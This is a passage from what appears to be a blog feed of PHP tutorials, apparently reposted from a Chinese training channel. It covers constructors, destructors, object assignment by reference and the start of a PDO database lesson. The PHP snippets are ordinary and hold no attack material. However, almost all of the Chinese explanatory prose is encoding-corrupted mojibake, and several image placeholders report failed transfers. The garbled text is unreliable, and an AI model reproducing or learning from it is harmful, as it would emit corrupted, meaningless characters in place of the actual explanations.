# æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–å±æ€§    public function __construct($count,$money){        $this-&gt;count = $count;        $this-&gt;money = $money;    }}# å®ä¾‹åŒ–$s = new Saler(100,100);            # ç³»ç»Ÿåœ¨new Saler(100,100)å¥½ä¹‹åï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ä¸€æ¬¡$s-&gt;__construct(1000,1000);            # å…è®¸æ‰‹åŠ¨è°ƒç”¨</code></pre><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€æ„é€ æ–¹æ³•__construct()æ˜¯ä¸€ç§ç³»ç»Ÿå†…ç½®çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ç‰¹æ€§æ˜¯ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–ä¹‹åï¼Œå¯¹è±¡ç«‹å³è‡ªåŠ¨è°ƒç”¨</p><p>2ã€æ„é€ æ–¹æ³•çš„ç›®çš„å°±æ˜¯ä¸ºäº†åˆå§‹åŒ–èµ„æºï¼ŒåŒ…å«å¯¹è±¡å±æ€§å’Œå…¶ä»–èµ„æº</p><p>3ã€ä¸€æ—¦æ„é€ æ–¹æ³•å®šä¹‰å¥½ä¹‹åï¼Œä¸”æ„é€ æ–¹æ³•è‡ªå¸¦å‚æ•°ï¼Œé‚£ä¹ˆå°±åªèƒ½ä½¿ç”¨<code>new ç±»å(å‚æ•°åˆ—è¡¨)</code>æ–¹å¼æ‰èƒ½æ­£ç¡®å®ä¾‹åŒ–</p><p>4ã€æ„é€ æ–¹æ³•å¯ä»¥å½“åšæ™®é€šæ–¹æ³•ç”±å¯¹è±¡è°ƒç”¨ï¼ˆä¸å»ºè®®ï¼‰</p><h3 id="8ã€ææ„æ–¹æ³•"><a href="#8ã€ææ„æ–¹æ³•" class="headerlink" title="8ã€ææ„æ–¹æ³•"></a><strong>8ã€ææ„æ–¹æ³•</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£ææ„æ–¹æ³•çš„ä½œç”¨ï¼Œèƒ½å¤Ÿå®é™…åº”ç”¨ææ„æ–¹æ³•</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>ææ„æ–¹æ³•</strong>ï¼š__destruct()ï¼Œä¹Ÿæ˜¯ä¸€ç§ç±»ç»“æ„ä¸­é­”æœ¯æ–¹æ³•ï¼Œä¸æ„é€ æ–¹æ³•ä¸€æ ·ï¼Œä¹Ÿæ˜¯ç³»ç»Ÿè§„å®šå¥½ï¼Œåªéœ€è¦å¼€å‘äººå‘˜<strong>æŠ„</strong>ä¸€éå³å¯ï¼Œå¯¹è±¡åœ¨è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</p><ul><li>ææ„æ–¹æ³•æ˜¯ç”¨æ¥å¯¹è±¡é”€æ¯æ—¶ä¸»åŠ¨é‡Šæ”¾èµ„æºçš„</li><li>å¯¹è±¡é”€æ¯<ul><li>å¯¹è±¡æ— å˜é‡æŒ‡å‘ï¼ˆå˜é‡æŒ‡å‘å…¶ä»–æ•°æ®ï¼‰</li><li>å¯¹è±¡è¢«ä¸»åŠ¨é”€æ¯ï¼ˆunseté”€æ¯å¯¹è±¡å˜é‡ï¼‰</li><li>è„šæœ¬æ‰§è¡Œç»“æŸï¼ˆè‡ªåŠ¨é‡Šæ”¾èµ„æºï¼‰</li></ul></li><li>PHPè„šæœ¬æ‰§è¡Œç»“æŸä¼šé‡Šæ”¾æ‰€æœ‰èµ„æºï¼Œæ‰€ä»¥ä¸€èˆ¬è¾ƒå°‘ä½¿ç”¨ææ„æ–¹æ³•</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å®šä¹‰ç±»ç»“æ„</p><p>2ã€ç¡®å®šéœ€è¦åœ¨å¯¹è±¡é”€æ¯æ—¶é‡Šæ”¾èµ„æº</p><p>3ã€ä½¿ç”¨ææ„æ–¹æ³•é‡Šæ”¾èµ„æº</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€ææ„æ–¹æ³•å®ç°ï¼šç±»ä¸­å¢åŠ ä¸€ä¸ª__destruct()æ–¹æ³•</p><pre><code>class Saler{      # ææ„æ–¹æ³•    public function __destruct(){        echo __FUNCTION__;    }}</code></pre><p>2ã€ææ„æ–¹æ³•è°ƒç”¨ï¼šææ„æ–¹æ³•æ˜¯åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨ï¼Œå¯¹è±¡çš„â€œå‚æ­»æŒ£æ‰â€</p><pre><code># å®ä¾‹åŒ–å¯¹è±¡$s = new Saler();# å¯¹è±¡å˜é‡æŒ‡å‘å…¶ä»–æ•°æ®$s = 1;    # ä¸»åŠ¨é”€æ¯å¯¹è±¡å˜é‡unset($s);            # è„šæœ¬æ‰§è¡Œç»“æŸè‡ªåŠ¨é‡Šæ”¾</code></pre><p>3ã€ææ„æ–¹æ³•ä¹Ÿæ˜¯æ™®é€šæ–¹æ³•ï¼Œå¯ä»¥ç”±å¯¹è±¡ç›´æ¥è°ƒç”¨</p><pre><code># æ¥ææ„æ–¹æ³•å®ç°ä»£ç $s = new Saler();$s-&gt;__destruct();        # æ€è€ƒï¼šæ­¤æ—¶å¯¹è±¡æ˜¯å¦è¢«é”€æ¯ï¼Ÿ</code></pre><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€ææ„æ–¹æ³•æ˜¯ä¸€ç§å¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•</p><p>2ã€ææ„æ–¹æ³•æ˜¯ç”¨æ¥å¯¹è±¡é”€æ¯è‡ªèº«æ‰€å ç”¨çš„èµ„æº</p><p>3ã€PHPä¸­è„šæœ¬æ‰§è¡Œç»“æŸï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å›æ”¶æ‰€æœ‰èµ„æºï¼Œå› æ­¤ä¸€èˆ¬PHPä¸­å¾ˆå°‘ä½¿ç”¨ææ„æ–¹æ³•</p><h3 id="9ã€å¯¹è±¡ä¼ å€¼"><a href="#9ã€å¯¹è±¡ä¼ å€¼" class="headerlink" title="9ã€å¯¹è±¡ä¼ å€¼"></a><strong>9ã€å¯¹è±¡ä¼ å€¼</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£PHPä¸­å¯¹è±¡ä¼ å€¼çš„æ–¹å¼</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>å¯¹è±¡ä¼ å€¼</strong>ï¼šå°†ä¿å­˜å¯¹è±¡çš„å˜é‡èµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªå˜é‡</p><ul><li>åœ¨PHPä¸­ï¼Œå¯¹è±¡çš„ä¼ å€¼æ˜¯<strong>å¼•ç”¨ä¼ é€’</strong>çš„ï¼šå³ä¸€ä¸ªå¯¹è±¡å˜é‡èµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªå˜é‡ï¼Œä¸¤ä¸ªå˜é‡æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€ï¼Œå³åªæœ‰ä¸€ä¸ªå¯¹è±¡ã€‚</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å®šä¹‰ç±»ç»“æ„</p><p>2ã€å®ä¾‹åŒ–äº§ç”Ÿå¯¹è±¡ï¼Œä¿å­˜åœ¨å˜é‡ä¸­</p><p>3ã€å°†ä¿å­˜å¯¹è±¡çš„å˜é‡èµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªå˜é‡</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å¯¹è±¡ä¼ å€¼å°±æ˜¯ä¿å­˜å¯¹è±¡çš„å˜é‡èµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªå˜é‡</p><pre><code>class Saler{}$s1 = new Saler();$s2 = $s1;</code></pre><p>2ã€å¯¹è±¡ä¼ å€¼æ˜¯å¼•ç”¨ä¼ é€’ï¼Œä¸ç®¡å¯¹è±¡èµ‹å€¼ç»™å¤šå°‘ä¸ªå˜é‡ï¼Œå†…å­˜ä¸­åªæœ‰ä¸€ä¸ªå¯¹è±¡</p><pre><code># è¯æ˜var_dump($s1,$s2);        # åŒä¸€ä¸ªå¯¹è±¡$s1-&gt;name = &apos;Saler&apos;;    # æ›´æ”¹ä¸€ä¸ªå˜é‡æ‰€ä¿å­˜å¯¹è±¡çš„å±æ€§echo $s2-&gt;name;            # è¾“å‡ºSaler</code></pre><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€å¯¹è±¡ä¼ å€¼æ–¹å¼æ˜¯<strong>å¼•ç”¨ä¼ å€¼</strong>ï¼Œä¸è®ºå¯¹è±¡å¦‚ä½•è¢«èµ‹å€¼ç»™å…¶ä»–å˜é‡ï¼Œå§‹ç»ˆåªæœ‰ä¸€ä¸ªå¯¹è±¡</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpé¢å‘å¯¹è±¡:PDO</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9APDO/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9APDO/</url>
      
        <content type="html"><![CDATA[<h4 id="è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"><a href="#è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ" class="headerlink" title="è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"></a>è½¬è½½äºï¼š<a href="https://space.bilibili.com/434398031?from=search&amp;seid=16258300813915690" target="_blank" rel="noopener">é»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ</a></h4><h1 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h1><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šå­¦ä¹ åˆ«äººå†™å¥½çš„ç±»çš„ä½¿ç”¨ï¼ŒæŒæ¡PDOç±»å¯¹æ•°æ®åº“çš„æ“ä½œï¼Œå¹¶ä¸”èƒ½å¤ŸåŸºäºPDOè¿›è¡ŒäºŒæ¬¡å°è£…æ¥å®ç°æ›´å¿«æ·çš„é¡¹ç›®å¼€å‘</p></blockquote><ul><li>PDOæ‰©å±•</li><li>PDOæ“ä½œ</li><li>PDOå¼‚å¸¸</li><li>å°è£…PDO</li></ul><blockquote><p>æ¦‚å¿µ</p></blockquote><p>PDOï¼šphp Data Objectï¼Œæ˜¯ä¸€ç§<strong>çº¯é¢å‘å¯¹è±¡</strong>çš„æ•°æ®åº“æ“ä½œæ‰©å±•</p><ul><li>PDOåœ¨php5ä»¥åçš„ç‰ˆæœ¬å¢åŠ ï¼Œæ˜¯ç›®å‰é€šç”¨çš„phpæ“ä½œæ•°æ®åº“çš„æ‰©å±•</li><li>PDOèƒ½å¤Ÿæ”¯æŒå¤šç§æ•°æ®åº“æ“ä½œï¼Œä¸é™å®šæ•°æ®åº“äº§å“ç±»å‹</li><li>PDOæ˜¯ä¸€ç§çº¯é¢å‘å¯¹è±¡çš„æ“ä½œï¼Œæœ‰ä¸‰ä¸ªç±»<ul><li>PDOç±»ï¼šåˆå§‹åŒ–å’ŒSQLæ‰§è¡Œ</li><li>PDOStatementç±»ï¼šç»“æœè§£æ</li><li>PDOExceptionç±»ï¼šå¼‚å¸¸å¤„ç†</li></ul></li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOæ˜¯å½“å‰phpæ“ä½œæ•°æ®åº“çš„é€šç”¨æ‰©å±•ï¼Œæ‰€æœ‰æ–°çš„é¡¹ç›®ç›®å‰éƒ½ä¼šé¦–é€‰PDOæ¥æ“ä½œæ•°æ®åº“</p><h2 id="ä¸€ã€-PDOæ‰©å±•"><a href="#ä¸€ã€-PDOæ‰©å±•" class="headerlink" title="ä¸€ã€ PDOæ‰©å±•"></a><strong>ä¸€ã€ PDOæ‰©å±•</strong></h2><blockquote><p>ç›®æ ‡ï¼šæŒæ¡PDOæ‰©å±•çš„åŠ è½½</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>PDOæ‰©å±•</strong>ï¼šPDOæä¾›äº†ä¸€å¥—å¸®åŠ©ç”¨æˆ·å®ç°å¤šæ•°æ®åº“æ“ä½œçš„ç»Ÿä¸€æ¥å£ï¼Œå±äºæ‰©å±•åŠ è½½</p><ul><li>é€šè¿‡ä½¿ç”¨PDOï¼Œå¼€å‘äººå‘˜ä¸éœ€è¦é¢å¤–è‡ªå®šä¹‰æ•°æ®åº“å¯¹åº”çš„æ“ä½œç±»ï¼Œä»è€Œç®€åŒ–å¼€å‘è¿‡ç¨‹</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€PDOåœ¨php5ä»¥å‰ï¼Œæ˜¯éœ€è¦æ‰‹åŠ¨åŠ è½½æ‰©å±•çš„ï¼Œåœ¨php.inié…ç½®æ–‡ä»¶ä¸­ï¼Œä¼šæœ‰è¿™ä¹ˆä¸€ä¸ªæ‰©å±•ï¼ˆåœ¨php5ä»¥åå°±è‡ªåŠ¨åŠ è½½äº†ä¸éœ€è¦æ‰‹åŠ¨å†åŠ è½½ï¼‰</p><pre><code>;extension = pdo                #ç°åœ¨php.iniä¸­æ‰¾ä¸åˆ°è¯¥é…ç½®é¡¹äº†</code></pre><p>2ã€PDOæ˜¯ä¸€ç§é’ˆå¯¹å¤šç§æ•°æ®åº“çš„æ‰©å±•ï¼Œé‚£å°±æ„å‘³ç€PDOå¾ˆåºå¤§ï¼Œæ‰€ä»¥ä¸ºäº†ä¿è¯phpè¿è¡Œçš„æ•ˆç‡ï¼ˆç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨å¼€å§‹æ—¶åŠ è½½æ‰©å±•ï¼‰ï¼Œé»˜è®¤å¹¶æ²¡æœ‰å¼€å¯å¯¹æ•°æ®åº“äº§å“çš„å¯¹åº”æ‰©å±•ï¼Œå› æ­¤è¿˜éœ€è¦åœ¨php.iniä¸­å¼€å¯ç›®å‰é¡¹ç›®æ‰€éœ€è¦çš„PDOå¯¹åº”æ•°æ®åº“äº§å“çš„æ”¯æŒ</p><pre><code>;extension=pdo_firebird;extension=pdo_mysql            #ç»å¤§éƒ¨åˆ†é¡¹ç›®ä½¿ç”¨çš„ï¼Œåªè¦å»æ‰æ³¨é‡Šé‡å¯Apacheå³å¯;extension=pdo_oci;extension=pdo_odbc;extension=pdo_pgsql;extension=pdo_sqlite</code></pre><p>3ã€åŠ è½½PDOå¯¹mysqlæ•°æ®åº“äº§å“çš„æ‰©å±•ï¼Œé‡å¯Apacheï¼Œç„¶åé€šè¿‡phpinfo()å‡½æ•°å°±å¯ä»¥æŸ¥çœ‹PDOçš„åŠ è½½æƒ…å†µäº†ï¼Œè‡³å°‘æœ‰ä¸¤ä¸ªåŠ è½½æ‰ç®—æˆåŠŸï¼šPDOæœ¬èº«å’ŒPDOé’ˆå¯¹çš„æ•°æ®åº“äº§å“</p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-9GltcHO5-1589898970676)(æ•ˆæœå›¾/PDOæ‰©å±•å¼€å¯æ•ˆæœ.png)]</p><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOæ˜¯ä¸€ç§å¤–éƒ¨æä¾›çš„æ‰©å±•ï¼Œphpå¦‚æœæƒ³ç›´æ¥è°ƒç”¨ï¼Œéœ€è¦åŠ è½½æ‰©å±•</p><p>2ã€PDOå› ä¸ºæ”¯æŒäº§å“å¾ˆå¤šï¼Œæ‰€ä»¥åˆ†è§£æˆäº†PDOæ”¯æŒæ‰©å±•å’ŒPDOå¯¹åº”æ•°æ®åº“äº§å“çš„æ”¯æŒï¼ŒPDOæ‰©å±•åœ¨php5ä»¥åè‡ªåŠ¨å¼€å¯ï¼Œè€Œæ•°æ®åº“äº§å“çš„æ”¯æŒéœ€è¦å¼€å‘è€…æ ¹æ®å®é™…é¡¹ç›®æ‰€æœ‰æ•°æ®åº“æ¥é€‰æ‹©æ€§å¼€å¯</p><h2 id="äºŒã€-PDOæ“ä½œ"><a href="#äºŒã€-PDOæ“ä½œ" class="headerlink" title="äºŒã€ PDOæ“ä½œ"></a><strong>äºŒã€ PDOæ“ä½œ</strong></h2><blockquote><p>å­¦ä¹ ç›®å½•ï¼šæŒæ¡ä½¿ç”¨ç³»ç»Ÿç±»çš„æ–¹å¼ï¼ŒæŒæ¡PDOç±»å’ŒPDOStatementç±»çš„åŸºæœ¬æ“ä½œï¼Œå®ç°æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥</p></blockquote><ul><li>PDOæ‰‹å†ŒæŸ¥é˜…</li><li>PDOç±»åŸºæœ¬åº”ç”¨</li><li>PDOå†™æ“ä½œ</li><li>PDOæŸ¥è¯¢æ“ä½œ</li><li>PDOäº‹åŠ¡åŠŸèƒ½</li><li>PDOé¢„å¤„ç†</li></ul><h3 id="1ã€PDOæ‰‹å†ŒæŸ¥é˜…"><a href="#1ã€PDOæ‰‹å†ŒæŸ¥é˜…" class="headerlink" title="1ã€PDOæ‰‹å†ŒæŸ¥é˜…"></a><strong>1ã€PDOæ‰‹å†ŒæŸ¥é˜…</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡ç³»ç»Ÿçš„ç±»çš„ä½¿ç”¨æ–¹æ³•ï¼Œå­¦ä¼šAPIæ–‡æ¡£çš„ä½¿ç”¨</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>æ‰‹å†ŒæŸ¥é˜…</strong>ï¼šæ˜¯æŒ‡å¯¹äºå·²ç»æ·»åŠ åˆ°phpç³»ç»Ÿå†…çš„å·¥å…·çš„ä½¿ç”¨æŸ¥è¯¢</p><ul><li>é€šè¿‡ç¿»é˜…æ‰‹å†Œï¼Œå¯ä»¥å¿«é€Ÿçš„äº†è§£ä¸€äº›å·¥å…·æˆ–è€…æ‰©å±•çš„åŠŸèƒ½å’Œä½¿ç”¨æ–¹å¼</li><li>é€šè¿‡ç¿»é˜…æ‰‹å†Œï¼Œå¯ä»¥è·å–ä¸€äº›åˆ«äººæä¾›è§£å†³æ–¹æ¡ˆ</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€æŸ¥è¯¢æ–¹å¼1ï¼šè¿›å…¥åˆ°æ“ä½œæ‰‹å†Œï¼Œç„¶åæ‰“å¼€ç›®å½•åˆ—è¡¨ï¼š<strong>å‡½æ•°å‚è€ƒ</strong>-&gt;<strong>æ•°æ®åº“æ‰©å±•</strong>-&gt;<strong>æ•°æ®åº“æŠ½è±¡å±‚</strong>-&gt;<strong>PDO</strong></p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-si8YaiLS-1589898970678)(æ•ˆæœå›¾\PDOç±»ä»‹ç».png)]</p><p><strong>æ³¨æ„</strong>ï¼šè¯¥æ–¹å¼èƒ½å¤Ÿæ–¹ä¾¿ä¸”æœ‰åºçš„çœ‹åˆ°ä¸€ä¸ªå·¥å…·æˆ–è€…æ‰©å±•çš„æ‰€ç”¨åŠŸèƒ½å’Œä½¿ç”¨æ–¹å¼ï¼ˆåˆå­¦è€…å»ºè®®ï¼‰</p><p>2ã€æŸ¥è¯¢æ–¹å¼2ï¼šç›´æ¥åœ¨æ“ä½œæ‰‹å†Œè¿›å…¥<code>ç´¢å¼•</code>ï¼Œç„¶ååœ¨é‡Œé¢è¾“å…¥PDO</p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-cQzX81UF-1589898970679)(æ•ˆæœå›¾\PDOæ£€ç´¢.png)]</p><p><strong>æ³¨æ„</strong>ï¼šè¯¥æ–¹å¼èƒ½å¤Ÿå¿«é€Ÿå®šä½åˆ°æŸ¥è¯¢çš„å…·ä½“å…ƒç´ ï¼Œéœ€è¦å¤§å®¶åœ¨æœ‰ä¸€å®šäº†è§£çš„æƒ…å†µä¸‹æ‰èƒ½å®Œæˆï¼ˆç³»ç»Ÿæ˜¯æŒ‰é¡ºåºåŒ¹é…ï¼‰ï¼Œåœ¨æ˜ç¡®è‡ªå·±æƒ³è¦äº†è§£å…·ä½“åŠŸèƒ½åï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ–¹å¼</p><p>3ã€ç³»ç»Ÿç±»ä½¿ç”¨æ–¹å¼ï¼šä¸€èˆ¬æ˜¯äº†è§£å¯¹è±¡çš„ç”Ÿæˆæ–¹å¼ï¼Œä»¥åŠå„é¡¹åŠŸèƒ½çš„è°ƒç”¨æ–¹å¼å’Œå…·ä½“æ•ˆæœ</p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-CK6Gnoii-1589898970681)(æ•ˆæœå›¾\ç³»ç»Ÿç±»ä½¿ç”¨æŠ€å·§1.png)]</p><p>4ã€ç³»ç»Ÿç±»ä½¿ç”¨æ–¹å¼ï¼šé™¤å¼€çŸ¥é“æ€ä¹ˆç”¨ä¹‹å¤–ï¼Œä¸€å®šè¿˜è¦å»äº†è§£è¿”å›ç»“æœå’Œ<code>æ„å¤–çŠ¶å†µ</code></p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-CqFvQF3h-1589898970682)(æ•ˆæœå›¾\ç³»ç»Ÿç±»ä½¿ç”¨æŠ€å·§2.png)]</p><p>5ã€å½“æˆ‘ä»¬äº†è§£äº†ä¸€ä¸ªå·¥å…·çš„åŸºæœ¬åŠŸèƒ½åï¼Œå°±å¯ä»¥æ‰¾åˆ°å…¥å£å¼€å§‹å¯¹å…¶å­¦ä¹ å’Œä½¿ç”¨äº†ã€‚ä¾‹å¦‚PDOä¸­æœ‰ä¸‰ä¸ªç±»ï¼Œæ¯ä¸ªç±»è´Ÿè´£ä¸åŒçš„åŠŸèƒ½éœ€æ±‚ã€‚æˆ‘ä»¬åªè¦æŒæ¡å½¼æ­¤é—´çš„åŠŸèƒ½å’Œç»ƒä¹ ï¼Œå°±å¯ä»¥ä½¿ç”¨PDOæ¥å®ç°æ•°æ®åº“æ“ä½œ</p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-m6ADYTca-1589898970684)(æ•ˆæœå›¾\PDOä¸‰ä¸ªç±».png)]</p><blockquote><p>å°ç»“</p></blockquote><p>1ã€ä»»ä½•ä¸€ç§ç³»ç»Ÿæ”¯æŒï¼ŒåŒ…æ‹¬å·¥å…·å’Œæ‰©å±•ï¼Œéƒ½å¯ä»¥é€šè¿‡æ“ä½œæ‰‹å†Œæ¥å­¦ä¹ å’Œåº”ç”¨</p><p>2ã€PDOå±äºä¸€ç§æ•°æ®åº“æ‰©å±•ï¼Œå¯ä»¥åœ¨<strong>å‡½æ•°å‚è€ƒ</strong>ä¸‹å¯¹åº”çš„<strong>æ•°æ®åº“æ‰©å±•</strong>ä¸‹æ‰¾åˆ°</p><p>3ã€æ‰©å±•å­¦ä¹ åº”è¯¥æ˜¯ç›®çš„æ€§çš„ï¼Œäº†è§£æœ‰å“ªäº›åŠŸèƒ½ä»¥åŠå¦‚ä½•ä½¿ç”¨æŸä¸ªåŠŸèƒ½</p><p>4ã€PDOæœ‰ä¸‰ä¸ªç±»éœ€è¦å­¦ä¹ </p><h3 id="2ã€PDOç±»åŸºæœ¬åº”ç”¨"><a href="#2ã€PDOç±»åŸºæœ¬åº”ç”¨" class="headerlink" title="2ã€PDOç±»åŸºæœ¬åº”ç”¨"></a><strong>2ã€PDOç±»åŸºæœ¬åº”ç”¨</strong></h3><blockquote><p>ç›®æ ‡ï¼šå¿«é€Ÿäº†è§£PDOç±»çš„åŸºæœ¬åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ©ç”¨PDOç±»å®ç°æ•°æ®åº“çš„åˆå§‹åŒ–è®¤è¯å’ŒSQLæ‰§è¡Œ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>PDOç±»åŸºæœ¬åº”ç”¨</strong>ï¼šäº†è§£PDOç±»çš„æ–¹æ³•ï¼Œä½¿ç”¨PDOæ–¹æ³•è§£å†³ç›¸åº”éœ€æ±‚é—®é¢˜</p><ul><li><p>PDOç±»è™½ç„¶æä¾›äº†å¾ˆå¤šæ–¹æ³•ï¼Œä½†æ˜¯å¸¸ç”¨çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ä¸ª</p><ul><li>PDO::__construct()ï¼šå®ä¾‹åŒ–PDOå¯¹è±¡ï¼šå¸®åŠ©å®ç°è¿æ¥è®¤è¯ã€æ•°æ®åº“é€‰æ‹©ã€å­—ç¬¦é›†è®¾ç½®</li><li>PDO::exec()ï¼šæ‰§è¡Œä¸€ä¸ªå†™æ“ä½œSQLæŒ‡ä»¤ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°</li><li>PDO::query()ï¼šæ‰§è¡Œä¸€ä¸ªè¯»æ“ä½œSQLæŒ‡ä»¤ï¼Œè¿”å›ä¸€ä¸ªPDOStatementç±»å¯¹è±¡ï¼ˆåè€…è¿›è¡Œæ•°æ®è§£ææ“ä½œï¼‰</li><li>PDO::errorCode()å’ŒPDO::errorInfo()ï¼šè·å–ä¸Šæ¬¡é”™è¯¯çš„ä¿¡æ¯ï¼ˆé”™è¯¯ç å’Œé”™è¯¯æè¿°æ•°ç»„ï¼‰</li></ul></li><li><p>PDOå®ä¾‹åŒ–å¯¹è±¡ï¼šåˆ©ç”¨å…¶æ„é€ æ–¹æ³•__construct(string $dsn,string $user,string $pass[,array $drivers])å®ç°ï¼Œæ„é€ æ–¹æ³•ç”±4ä¸ªå‚æ•°ç»„æˆï¼Œå…¶ä¸­ä¸€èˆ¬å‰ä¸‰ä¸ªä¸ºå¿…é¡»å‚æ•°ï¼Œç¬¬å››ä¸ªä¸ºå¯é€‰å‚æ•°</p><ul><li>$dsnï¼šä¸€ä¸ªæ•°æ®åº“åŸºæœ¬ä¿¡æ¯å­—ç¬¦ä¸²ï¼ŒåŒ…å«æ•°æ®åº“äº§å“ï¼Œä¸»æœºåœ°å€ç­‰<ul><li>é©±åŠ¨åå­—ï¼ˆæ•°æ®åº“äº§å“ï¼‰ï¼Œä½¿ç”¨è‹±æ–‡<code>:</code>åˆ†éš”ï¼Œå¦‚mysql:è¡¨ç¤ºä½¿ç”¨mysqlæ•°æ®åº“</li><li>é©±åŠ¨é€‰é¡¹ï¼ˆä¸»æœºåœ°å€ï¼‰ï¼Œä½¿ç”¨host=å…·ä½“ä¸»æœºåœ°å€ï¼Œè·Ÿåœ¨é©±åŠ¨åå­—ä¹‹åï¼Œå¦‚â€™mysql:host=localhostâ€™</li><li>é©±åŠ¨é€‰é¡¹ï¼ˆç«¯å£ï¼‰ï¼Œä½¿ç”¨port=ç«¯å£å·ï¼Œé»˜è®¤ä¸º3306å¯ä»¥ä¸å†™ï¼Œæ‹¼å‡‘åœ¨é©±åŠ¨åå­—åï¼Œä¸åŒºåˆ†å…ˆåé¡ºåºã€‚å¦‚â€™mysql:host=localhost;port=3306â€™æˆ–è€…â€™mysql:port=3306;host=localhostâ€™ï¼Œä½¿ç”¨åˆ†å·å’Œå…¶ä»–é©±åŠ¨åˆ†å¼€</li><li>é©±åŠ¨é€‰é¡¹ï¼ˆæ•°æ®åº“åå­—ï¼‰ï¼Œä½¿ç”¨dbname=æ•°æ®åº“åå­—ï¼ˆå¯ä»¥äº‹å…ˆæ²¡æœ‰ï¼‰</li><li>å­—ç¬¦é›†è®¾ç½®ï¼ˆå­—ç¬¦é›†åå­—ï¼‰ä½¿ç”¨charset=å­—ç¬¦é›†åå­—ï¼ˆå¯ä»¥äº‹å…ˆæ²¡æœ‰ï¼‰</li></ul></li><li>$userï¼šç”¨æˆ·åï¼Œå¦‚æœæ•°æ®åº“å…è®¸åŒ¿åç”¨æˆ·å‡ºç°ï¼Œé‚£ä¹ˆå¯ä»¥æ²¡æœ‰è¯¥å‚æ•°ï¼ˆåªæœ‰$dsnï¼‰</li><li>$passï¼šå¯†ç ï¼Œä¸ç”¨æˆ·åä¸€æ 